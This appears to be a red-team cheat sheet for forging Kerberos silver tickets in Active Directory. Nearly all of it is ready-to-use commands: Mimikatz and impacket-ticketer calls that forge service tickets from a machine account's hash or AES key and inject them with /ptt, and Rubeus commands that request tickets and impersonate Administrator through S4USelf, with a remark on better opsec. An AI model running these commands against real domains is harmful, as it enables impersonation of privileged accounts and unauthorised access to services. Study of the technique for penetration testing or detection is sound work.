# Silver Ticket

### 1) Create ST

/rc4 take the service account (generally the machine account) hash. /aes128 or /aes256 can be used for AES keys.

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /target:<target>.domain.local /service:CIFS /rc4:<account_hash> /ptt"'

Requesting a ST with a valid TGT can be performed with Rubeus like this:

    .\Rubeus.exe asktgs /ticket:tgt.kirbi /service:LDAP/dc.domain.local,cifs/dc.domain.local /ptt

Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):

    .\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/target.domain.local" /ticket:"<base64_target_TGT>" /nowrap

MISC

    impacket-ticketer -nthash MACHINE_NT_HASH -domain-sid DOMAIN_SID -domain DOMAIN ANY_USER

    mimikatz "kerberos::golden /sid:CURRENT_USER_SID /domain:DOMAIN_SID /target:TARGET_SERVER /service:TARGET_SERVICE /aes256:COMPUTER_AES256_KEY /user:ANY_USER /ptt"
